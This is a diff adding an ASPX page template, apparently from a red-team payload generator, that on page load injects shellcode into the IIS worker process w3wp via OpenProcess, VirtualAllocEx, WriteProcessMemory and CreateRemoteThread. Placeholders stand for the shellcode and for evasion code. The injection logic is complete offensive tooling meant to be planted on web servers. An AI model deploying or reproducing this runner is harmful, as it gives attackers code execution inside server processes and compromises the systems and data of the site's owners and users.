@@ -1,0 +1,43 @@
+<%@ Page Language="C#" AutoEventWireup="true" Debug="true"%>
+<!-- Remove 'Debug="true"' from the above statement, as well as any comments below when ready for use.-->
+<h1> MyASPX Runner</h1>
+<p> Check out <a href=https://red.infiltr8.io>Infiltr8</a> for more!</p>
+
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.Runtime.InteropServices" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Security.Cryptography" %>
+//####INCLUDE####
+
+<script runat="server">
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")] private static extern void Sleep(uint dwMilliseconds);//####DEFINE####
+
+    //####DEFINE####
+    //####CODE####
+
+
+    protected void Page_Load(object sender, EventArgs esfd)
+    {
+
+        //####EVASION####
+
+        string TGT_PROC = "w3wp";
+        byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
+
+        //####CALL####
+
+        Process[] localByName = System.Diagnostics.Process.GetProcessesByName(TGT_PROC);
+        IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+        IntPtr outSize;
+        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+
+</script>
